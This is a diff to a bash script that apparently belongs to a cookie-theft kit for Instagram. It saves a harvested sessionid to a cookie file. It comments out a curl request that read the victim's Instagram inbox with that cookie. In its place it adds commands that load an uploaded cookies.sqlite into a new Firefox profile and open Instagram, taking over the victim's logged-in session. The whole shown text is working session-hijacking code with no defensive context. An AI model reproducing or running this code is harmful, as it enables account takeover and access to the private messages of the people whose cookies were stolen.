@@ -55,8 +55,11 @@ infoinsta() {
 
 
 
-curl -b insta_cookies.txt  -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -L https://i.instagram.com/api/v1/news/inbox/?
+#curl -b insta_cookies.txt  -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -L https://i.instagram.com/api/v1/news/inbox/?
 
+firefox -CreateProfile getcookies
+cp uploadedfiles/cookies.sqlite ~/.mozilla/firefox/*.getcookies
+firefox -P getcookies https://www.instagram.com/
 
 exit 1
 
@@ -73,7 +76,7 @@ else
 
 printf "#HttpOnly_.instagram.com	TRUE	/	TRUE	9999999999	sessionid	%s\n" $cookie > insta_cookies.txt
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Instagram Cookies Found! (Saved: insta_cookies.txt)\e[0m\n"
-read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Get user inbox news?\e[0m\e[1;92m [Y/n]: \e[0m' instainfo
+read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Open Firefox?\e[0m\e[1;92m [Y/n]: \e[0m' instainfo
 
 if [[ $instainfo == "Y" || $instainfo == "Yes" || $instainfo == "y" || $instainfo == "yes" ]]; then
 infoinsta
